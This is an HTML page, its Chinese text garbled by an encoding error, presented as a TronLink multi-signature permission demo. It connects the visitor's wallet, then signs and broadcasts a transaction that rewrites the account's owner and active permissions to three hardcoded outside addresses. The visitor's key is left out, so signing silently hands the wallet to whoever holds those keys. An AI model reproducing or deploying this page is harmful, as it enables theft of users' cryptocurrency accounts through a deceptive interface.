<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>TronLink å¤šç­¾æƒé™ç­¾åæ¼”ç¤º</title>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
</head>
<body>
  <h1>ğŸ” ä½¿ç”¨ TronLink è¿›è¡Œå¤šç­¾æƒé™æ›´æ–°</h1>
  <button id="connectBtn">è¿æ¥ TronLink é’±åŒ…</button>
  <p id="walletAddress"></p>
  <button id="signBtn" disabled>ç­¾åå¹¶å¹¿æ’­æƒé™æ›´æ–°äº¤æ˜“</button>
  <pre id="result"></pre>
  <script>
    const connectBtn = document.getElementById('connectBtn');
    const signBtn = document.getElementById('signBtn');
    const walletAddress = document.getElementById('walletAddress');
    const resultBox = document.getElementById('result');
    let tronWeb = null;
    connectBtn.onclick = async () => {
      if (window.tronLink) {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        tronWeb = window.tronWeb;
        const address = tronWeb.defaultAddress.base58;
        walletAddress.innerText = 'å½“å‰åœ°å€: ' + address;
        signBtn.disabled = false;
      } else {
        alert('è¯·å…ˆå®‰è£… TronLink æ’ä»¶');
      }
    };
    signBtn.onclick = async () => {
      const permissionUpdate = {
        owner: {
          permission_name: "owner",
          threshold: 2,
          keys: [
            { address: "TCUF8G5VLJedxck3hy2s4okmw3VNchbZ9a", weight: 1 },
            { address: "TCYBsw5hW76p5mMfuSYP9qwnoidCo7yCx4", weight: 1 },
            { address: "TVGxYdjS15dKPg6HRq6ARavgTfLbQxfVpy", weight: 1 }
          ]
        },
        actives: [
          {
            type: "Active",
            id: 2,
            permission_name: "active",
            threshold: 2,
            operations: "7fff1fc0033ec30f000000000000000000000000000000000000000000000000",
            keys: [
              { address: "TCUF8G5VLJedxck3hy2s4okmw3VNchbZ9a", weight: 1 },
              { address: "TCYBsw5hW76p5mMfuSYP9qwnoidCo7yCx4", weight: 1 },
              { address: "TVGxYdjS15dKPg6HRq6ARavgTfLbQxfVpy", weight: 1 }
            ]
          }
        ]
      };
      try {
        const tx = await tronWeb.transactionBuilder.updateAccountPermissions(permissionUpdate, tronWeb.defaultAddress.base58);
        const signedTx = await tronWeb.trx.sign(tx);
        const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
        resultBox.innerText = JSON.stringify(receipt, null, 2);
      } catch (err) {
        resultBox.innerText = 'é”™è¯¯: ' + err.message;
      }
    };
  </script>
</body>
</html>
